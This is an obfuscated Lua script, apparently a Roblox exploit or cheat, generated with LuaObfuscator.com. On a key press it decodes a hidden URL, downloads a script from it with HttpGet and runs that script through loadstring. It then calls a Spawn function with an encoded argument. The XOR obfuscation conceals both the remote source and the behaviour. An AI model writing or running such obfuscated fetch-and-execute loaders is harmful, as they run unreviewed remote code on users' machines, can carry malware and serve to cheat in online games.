--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.1.6) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v11=0;local v12;while true do if (v11==0) then v12={};for v17=1 + 0, #v8 do v6(v12,v0(v4(v1(v2(v8,v17,v17 + 1 + 0)),v1(v2(v9,((1686 -(888 + 721)) -(6 + 27 + (149 -106))) + ((v17-1)% #v9),1 + 0 + 0 + ((v17-1)% #v9) + (1676 -((1033 -442) + 1084)))))%((1063 -(114 + 598)) -(49 + 46))));end v11=1;end if (v11==1) then return v5(v12);end end end game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(v10)if (v10==v7("\91","\42\70\31\177\142")) then local v13=(1985 -(1300 + 250)) -(297 + 112 + 26);local v14;local v15;local v16;while true do if (v13==0) then v14=0 + 0;v15=nil;v13=785 -(658 + 126);end if ((610 -((1840 -(1459 + 67)) + 295))==v13) then v16=nil;while true do if (v14==0) then v15=loadstring(game:HttpGet(v7("\40\15\15\94\51\65\84\1\50\26\12\0\39\18\15\70\53\25\14\93\37\9\24\65\46\15\30\64\52\85\24\65\45\84\23\65\44\72\73\29\115\79\79\29\111\23\20\66\37\29\15\92\47\15\12\65\110\28\18\90\40\14\25\0\41\20\84\67\33\18\21\1\51\30\30\69\113\85\23\91\33","\64\123\123\46")))();v16={};v14=(4 -3) -0;end if (v14==1) then v15:Spawn(v7("\12\142\113\165","\95\235\20\206"),unpack(v16));break;end end break;end end end end);